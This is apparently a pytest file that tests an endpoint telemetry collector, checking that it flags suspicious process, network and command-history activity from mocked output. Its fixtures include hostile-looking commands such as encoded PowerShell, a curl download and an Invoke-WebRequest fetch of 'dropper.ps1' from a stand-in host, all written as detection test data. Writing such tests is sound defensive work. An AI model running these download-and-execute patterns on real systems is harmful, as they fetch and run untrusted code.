from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace

import pytest

from avchain.endpoint.collector import collect_native_snapshot_telemetry

POWERSHELL_EVENT_QUERY = (
    "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' "
    "-MaxEvents 25 | Select-Object -ExpandProperty Message"
)


def test_collect_native_snapshot_telemetry_parses_mocked_subprocess_output(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    outputs = {
        ("tasklist", "/fo", "csv", "/nh"): (
            '"setup.exe","1234","Console","1","10,000 K"\n'
        ),
        ("python", "-m", "pip", "list", "--format=json"): (
            '[{"name": "requests", "version": "1.0"}]'
        ),
        (
            "netstat",
            "-ano",
        ): "TCP 127.0.0.1:50000 8.8.8.8:443 ESTABLISHED 1234\n",
        (
            "powershell",
            "-NoProfile",
            "-Command",
            POWERSHELL_EVENT_QUERY,
        ): "powershell -EncodedCommand AAAA\n",
    }

    def fake_run(command, capture_output, text, check):
        _ = capture_output, text, check
        return SimpleNamespace(stdout=outputs.get(tuple(command), ""), returncode=0)

    monkeypatch.setattr("avchain.endpoint.collector.os.name", "nt")
    monkeypatch.setattr("avchain.endpoint.collector.subprocess.run", fake_run)

    events = collect_native_snapshot_telemetry(limit=10)
    observables = [event.observable for event in events]

    assert "process:setup.exe" in observables
    assert "package:requests" in observables
    assert "network:8.8.8.8" in observables


def test_collect_native_snapshot_telemetry_includes_command_history_markers(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    history_path = tmp_path / "ConsoleHost_history.txt"
    history_path.write_text(
        "\n".join(
            [
                "powershell -EncodedCommand AAAA",
                "curl http://example.test/file",
                "npm install suspicious-package --ignore-scripts=false",
            ]
        ),
        encoding="utf-8",
    )

    def fake_run(command, capture_output, text, check):
        _ = command, capture_output, text, check
        return SimpleNamespace(stdout="", returncode=1)

    monkeypatch.setattr(
        "avchain.endpoint.collector._history_candidate_paths",
        lambda: [history_path],
    )
    monkeypatch.setattr("avchain.endpoint.collector.subprocess.run", fake_run)

    events = collect_native_snapshot_telemetry(limit=10)
    observables = [event.observable for event in events]

    assert "command:encodedcommand" in observables
    assert "command:network-download" in observables
    assert "command:package-install" in observables


def test_collect_native_snapshot_telemetry_reads_powershell_event_log_markers(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    outputs = {
        ("tasklist", "/fo", "csv", "/nh"): "",
        ("python", "-m", "pip", "list", "--format=json"): "[]",
        ("netstat", "-ano"): "",
        (
            "powershell",
            "-NoProfile",
            "-Command",
            POWERSHELL_EVENT_QUERY,
        ): (
            "powershell Invoke-WebRequest https://example.test/dropper.ps1\n"
            "npm install suspicious-package --ignore-scripts=false\n"
        ),
    }

    def fake_run(command, capture_output, text, check):
        _ = capture_output, text, check
        return SimpleNamespace(stdout=outputs.get(tuple(command), ""), returncode=0)

    monkeypatch.setattr("avchain.endpoint.collector.os.name", "nt")
    monkeypatch.setattr("avchain.endpoint.collector.subprocess.run", fake_run)
    monkeypatch.setattr(
        "avchain.endpoint.collector._history_candidate_paths",
        lambda: [],
    )

    events = collect_native_snapshot_telemetry(limit=10)
    observables = [event.observable for event in events]

    assert "command:powershell-download" in observables
    assert "command:package-install" in observables
